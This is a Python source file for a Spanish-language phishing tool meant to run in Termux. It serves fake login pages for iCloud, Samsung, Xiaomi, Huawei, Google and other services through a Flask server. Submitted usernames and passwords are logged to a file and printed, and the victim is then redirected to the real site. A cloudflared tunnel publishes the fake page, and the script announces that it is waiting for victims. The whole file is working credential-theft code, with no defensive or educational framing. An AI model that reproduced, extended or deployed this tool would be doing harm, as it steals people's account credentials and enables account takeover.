import os
import threading
import subprocess
import re
from time import sleep
from flask import Flask, render_template, redirect, request

# Configuración de servicios
SERVICIOS = {
    "01": ("iCloud", "https://www.icloud.com"),
    "02": ("Samsung", "https://account.samsung.com"),
    "03": ("Xiaomi", "https://account.xiaomi.com"),
    "04": ("Huawei", "https://id7.cloud.huawei.com"),
    "05": ("Motorola", "https://motorola.cl"),
    "06": ("Oppo", "https://id.oppo.com"),
    "07": ("Google", "https://google.com"),
    "08": ("Junaeb", "https://junaeb.cl"),
}

def banner():
    os.system('clear')
    print(r"""
  _____   _____   _____  __  __ _____ 
 |  __ \ / ____| |  __ \|  \/  |  __ \
 | |__) | |      | |  | | \  / | |  | |
 |  ___/| |      | |  | | |\/| | |  | |
 | |    | |____  | |__| | |  | | |__| |
 |_|     \_____| |_____/|_|  |_|_____/ 
    """)
    print("\033[1;37m  ──────────────────────────────────────────")
    print("\033[1;31m  [>] MODO: TERMUX ANDROID | PORT: 5000")
    print("\033[1;37m  ──────────────────────────────────────────\033[0m")

def iniciar_servidor(plantilla, url_real):
    app = Flask(__name__)
    
    # Silenciar logs innecesarios de Flask
    import logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)

    @app.route('/')
    def index(): 
        return render_template(plantilla)

    @app.route('/submit', methods=['POST'])
    def submit():
        u, p = request.form.get('username'), request.form.get('password')
        if u and p:
            with open('datos.txt', 'a') as f:
                f.write(f"Servicio: {plantilla} | User: {u} | Pass: {p}\n")
                print(f"\n\n\033[1;32m[!] DATOS RECIBIDOS: \033[1;37m{u}:{p}\033[0m")
            return redirect(url_real)
        return redirect('/')
    
    app.run(port=5000, debug=False, use_reloader=False)

def ejecutar_tunel():
    print("\033[1;33m[*] Iniciando tunel remoto...\033[0m")
    
    # COMANDO SOLICITADO PARA TERMUX
    comando = "cloudflared tunnel --url localhost:5000"
    
    proceso = subprocess.Popen(
        comando,
        stderr=subprocess.PIPE,
        stdout=subprocess.PIPE,
        text=True,
        shell=True
    )

    link = None
    # Leer la salida para extraer el link de trycloudflare
    for _ in range(60): 
        linea = proceso.stderr.readline()
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', linea)
        if match:
            link = match.group(0)
            print(f"\n\033[1;32m[+] LINK PUBLICO: \033[1;37m{link}\033[0m")
            print("\033[1;36m[*] Esperando victimas... (No cierres la app)\033[0m")
            break
        sleep(0.2)
    
    if not link:
        print("\033[1;31m[!] Error: No se obtuvo el link. ¿Instalaste cloudflared?\033[0m")
    
    return proceso

def menu():
    while True:
        banner()
        keys = list(SERVICIOS.keys())
        for i in range(len(keys)):
            id_s = keys[i]
            print(f"  [{id_s}] {SERVICIOS[id_s][0]}")
        
        print("\n  [00] Ver Datos  [x] Salir")
        op = input("\n\033[1;32mSeleccione: \033[0m").strip()
        
        if op.lower() == 'x': break
        
        if op == "00":
            if os.path.exists('datos.txt'):
                with open('datos.txt', 'r') as f: print("\n" + f.read())
            else: print("\nNo hay datos registrados.")
            input("\nPresiona Enter para continuar...")
            continue

        if op in SERVICIOS:
            nombre, url = SERVICIOS[op]
            plantilla = f"{nombre.lower()}.html"
            
            # Iniciar Flask
            threading.Thread(target=iniciar_servidor, args=(plantilla, url), daemon=True).start()
            sleep(1.5)
            
            # Iniciar Tunel
            proc_cf = ejecutar_tunel()
            
            input("\n\033[1;33mPresiona ENTER para detener el tunel y volver...\033[0m")
            proc_cf.terminate()
            print("[*] Tunel detenido.")
            sleep(1)

if __name__ == '__main__':
    menu()
